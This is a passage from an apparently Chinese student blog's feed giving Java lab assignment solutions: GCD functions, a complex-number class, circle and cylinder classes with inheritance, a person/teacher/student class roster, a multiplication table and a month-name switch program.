class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> rec(y,x%y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">one o=<span class="keyword">new</span> one();</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line">m=<span class="number">56</span>;</span><br><span class="line">n=<span class="number">91</span>;</span><br><span class="line">System.out.println(o.cyc(m,n));</span><br><span class="line">System.out.println(o.rec(m,n));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题2、"><a href="#问题2、" class="headerlink" title="问题2、"></a>问题2、</h3><p>编写一个完整的Java Application程序，其中设计一个复数类Complex，利用它验证两个复数 1+2i 和3+4i 相加产生一个新的复数 4+6i 。复数类Complex的设计必须满足如下要求：<br>1）Complex 的属性有：<br>realPart：int型，代表复数的实数部分；<br>maginPart：int型，代表复数的虚数部分。<br>2）Complex 的方法有：<br>Complex()：构造方法，将复数的实部和虚部都置0；<br>Complex(int r , int i )：构造方法，形参 r 为实部的初值，i为虚部的初值。<br>3）Complex complexAdd(Complex a)：将当前复数对象与形参复数对象相加，最后的结果仍是一个复数对象，返回给此方法的调用者。<br>4）String toString(): 把当前复数对象的实部、虚部组合成 a+bi 的字符串形式，其中a 和 b分别为实部和虚部的数据。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">complex</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> rp,mp;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">complex</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">rp=mp=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">complex</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">rp=i;</span><br><span class="line">mp=j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> complex <span class="title">complexadd</span><span class="params">(complex a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.rp=<span class="keyword">this</span>.rp+a.rp;</span><br><span class="line"><span class="keyword">this</span>.mp=<span class="keyword">this</span>.mp+a.mp;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">String s=rp+<span class="string">"+"</span>+mp+<span class="string">"i"</span>;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">complex c1=<span class="keyword">new</span> complex(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">complex c2=<span class="keyword">new</span> complex(<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">c1.complexadd(c2);</span><br><span class="line">System.out.println(c1.toString());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题3、"><a href="#问题3、" class="headerlink" title="问题3、"></a>问题3、</h3><p>编写一个包含圆类的程序，并为圆类设计几个构造方法和一般方法，在主方法中创建一个圆类对象并输出它的周长和面积。<br>要求：<br>    属性有3个：x,y,r，分别放置圆心坐标和半径；<br>    构造方法有2个。一个是无参的，用于设置3个属性的值都为0；另一个有参的，用于设置3个属性的值，以确定一个具体的圆。<br>    计算周长的方法：double zc()；<br>计算面积的方法：double mj()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">yuan</span> </span>&#123;</span><br><span class="line"><span class="keyword">double</span> x,y,r;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">yuan</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">x=y=r=<span class="number">0.0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">yuan</span><span class="params">(<span class="keyword">double</span> x,<span class="keyword">double</span> y,<span class="keyword">double</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.x=x;</span><br><span class="line"><span class="keyword">this</span>.y=y;</span><br><span class="line"><span class="keyword">this</span>.r=r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">zc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*Math.PI*<span class="keyword">this</span>.r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">mj</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> Math.PI*Math.pow(<span class="keyword">this</span>.r, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="问题4、"><a href="#问题4、" class="headerlink" title="问题4、"></a>问题4、</h3><p>编写一个程序，它含有一个圆类、圆柱类和主类。<br>要求：<br>    1）圆类参考上一题中的圆类；<br>    2）圆柱类：继承圆类，并加入一个属性h(高)；<br>              构造方法(给4个属性赋值)；<br>              计算面积的方法(double mj())；<br>              计算体积的方法(double tj())。<br>       注意，要充分利用父类的方法。<br>    3）主类：在主方法中创建圆和圆柱类的对象，然后计算并输出它们的面积及圆柱的体积。</p><p>yuanzhu类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">yuanzhu</span> <span class="keyword">extends</span> <span class="title">yuan</span></span>&#123;</span><br><span class="line"><span class="keyword">double</span> h;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">yuanzhu</span><span class="params">(<span class="keyword">double</span> x,<span class="keyword">double</span> y,<span class="keyword">double</span> r,<span class="keyword">double</span> h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">super</span>(x,y,r);</span><br><span class="line"><span class="keyword">this</span>.h=h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">mj</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.zc()*<span class="keyword">this</span>.h+<span class="number">2</span>*<span class="keyword">super</span>.mj();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">tj</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.mj()*<span class="keyword">this</span>.h;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main_yz</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">yuan yuan1=<span class="keyword">new</span> yuan(<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>);</span><br><span class="line">yuanzhu yuanzhu1=<span class="keyword">new</span> yuanzhu(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">2</span>);</span><br><span class="line">System.out.println(<span class="string">"圆的面积是："</span>+yuan1.mj());</span><br><span class="line">System.out.println(<span class="string">"圆柱的面积是："</span>+yuanzhu1.mj());</span><br><span class="line">System.out.println(<span class="string">"圆柱的体积是："</span>+yuanzhu1.tj());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QScZwt.png" alt="QScZwt.png"></p><h3 id="问题6、"><a href="#问题6、" class="headerlink" title="问题6、"></a>问题6、</h3><p>编写一个含有5个类的程序：<br>      类Person:<br>          属性：编号、姓名、性别；<br>          构造方法：确定编号和姓名；<br>          一般方法：修改编号、姓名，获取编号、姓名。<br>      类Teacher：继承类Person并增加：<br>          属性：系别；<br>          构造方法：调用父类的构造方法；<br>          一般方法：修改、获取系别。<br>      类Student：继承类Person并增加：<br>          属性：班级；<br>          构造方法：调用父类的构造方法；<br>          一般方法：修改、获取班级属性值。<br>      类Classes：<br>          属性：班级名称，学生名单(Student类对象的数组)；<br>          构造方法：确定班级名称；<br>          一般方法：建立学生名单，输出学生名单。<br>      类Main：<br>主类。主方法中创建一个班级，然后建立该班级的学生名单，最后<br>输出学生名单。 </p><p>person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">String name,gender;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">person</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">person</span><span class="params">(<span class="keyword">int</span> id,String name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.id=id;</span><br><span class="line"><span class="keyword">this</span>.name=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">revise_id</span><span class="params">(<span class="keyword">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.id=id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">revise_name</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.name=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get_id</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">get_name</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>teacher类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">teacher</span> <span class="keyword">extends</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">String faculty;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">teacher</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">teacher</span><span class="params">(<span class="keyword">int</span> id,String name,String faculty)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">super</span>(id,name);</span><br><span class="line"><span class="keyword">this</span>.faculty=faculty;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">revise_facilty</span><span class="params">(String Faculty)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.faculty=faculty;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">get_faculty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.faculty;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>student类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">student</span> <span class="keyword">extends</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">String class_number;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">student</span><span class="params">(<span class="keyword">int</span> id,String name,String class_number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">super</span>(id,name);</span><br><span class="line"><span class="keyword">this</span>.class_number=class_number;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">revise_class_number</span><span class="params">(String class_number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.class_number=class_number;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">get_class_number</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.class_number;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>classes类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classes</span> </span>&#123;</span><br><span class="line">String class_name;</span><br><span class="line">student student_list[];</span><br><span class="line"><span class="keyword">int</span> student_number;</span><br><span class="line">teacher teacher;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">classes</span><span class="params">(String class_name,teacher tec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.class_name=class_name;</span><br><span class="line"><span class="keyword">this</span>.teacher=tec;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_student_list</span><span class="params">(student student_list[],<span class="keyword">int</span> student_number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.student_list=student_list;</span><br><span class="line"><span class="keyword">this</span>.student_number=student_number;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print_student_list</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"班级名称是："</span>+<span class="string">"\t"</span>+<span class="keyword">this</span>.class_name);</span><br><span class="line">System.out.println(<span class="string">"任课教师是："</span>+<span class="string">"\t"</span>+<span class="keyword">this</span>.teacher.name);</span><br><span class="line">System.out.println(<span class="string">"学生名单如下："</span>);</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="keyword">this</span>.student_number;i++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"\t"</span>+<span class="string">"姓名："</span>+<span class="string">"\t"</span>+<span class="keyword">this</span>.student_list[i].name+<span class="string">"\t"</span>+<span class="string">"学号:"</span>+<span class="string">"\t"</span>+<span class="keyword">this</span>.student_list[i].id);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main_class</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">"请输入班级名称："</span>);</span><br><span class="line">String cn=s.nextLine();</span><br><span class="line">System.out.println(<span class="string">"请输入任课老师姓名和院系"</span>);</span><br><span class="line">teacher tec=<span class="keyword">new</span> teacher();</span><br><span class="line">tec.revise_name(s.nextLine());</span><br><span class="line">tec.revise_facilty(s.nextLine());</span><br><span class="line">classes banji=<span class="keyword">new</span> classes(cn,tec);</span><br><span class="line">System.out.println(<span class="string">"请输入学生人数："</span>);</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">n=s.nextInt();</span><br><span class="line">student stu[]=<span class="keyword">new</span> student[n];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">System.out.println(<span class="string">"请输入学生学号和姓名:"</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line">stu[i]=<span class="keyword">new</span> student(s.nextInt(),s.nextLine(),cn);</span><br><span class="line">&#125;</span><br><span class="line">banji.set_student_list(stu, n);</span><br><span class="line">banji.print_student_list();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QSc77t.png" alt="QSc77t.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Java实验三。&lt;/p&gt;
    
    </summary>
    
    
      <category term="java" scheme="https://1187100546.github.io/categories/java/"/>
    
    
      <category term="java" scheme="https://1187100546.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java实验二</title>
    <link href="https://1187100546.github.io/2019/11/26/java-shiyan-2/"/>
    <id>https://1187100546.github.io/2019/11/26/java-shiyan-2/</id>
    <published>2019-11-26T12:09:34.000Z</published>
    <updated>2019-11-26T12:30:11.154Z</updated>
    
    <content type="html"><![CDATA[<p>java实验二。</p><a id="more"></a><h3 id="问题1、"><a href="#问题1、" class="headerlink" title="问题1、"></a>问题1、</h3><p> 打印一个三角形的1~9的乘法表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">chenfa</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.print(<span class="string">"*"</span>+<span class="string">"\t"</span>);</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>;i &lt;= <span class="number">9</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(i+<span class="string">"\t"</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line"><span class="keyword">for</span>(x = <span class="number">1</span>;x &lt;= <span class="number">9</span>;x++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(x+<span class="string">"\t"</span>);</span><br><span class="line"><span class="keyword">for</span>(y = <span class="number">1</span>;y &lt;= x; y++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(x*y+<span class="string">"\t"</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/11/26/QSrMrt.png" alt="QSrMrt.png"></p><h3 id="问题2、"><a href="#问题2、" class="headerlink" title="问题2、"></a>问题2、</h3><p>编写一程序，将从键盘输入的每个月份数(整数)显示出其对应的英文，直至输入0结束，注意对非法数据的处理。  (while,switch语句)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">two</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">"请输入月份"</span>);</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">m=s.nextInt();</span><br><span class="line"><span class="keyword">if</span>(m==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"输入结束"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(m)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:System.out.println(<span class="string">"January"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:System.out.println(<span class="string">"February"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:System.out.println(<span class="string">"March"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:System.out.println(<span class="string">"April"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:System.out.println(<span class="string">"May"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:System.out.println(<span class="string">"June"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:System.out.println(<span class="string">"July"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:System.out.println(<span class="string">"August"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:System.out.println(<span class="string">"September"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:System.out.println(<span class="string">"October"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">11</span>:System.out.println(<span class="string">"November"</span>);<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span 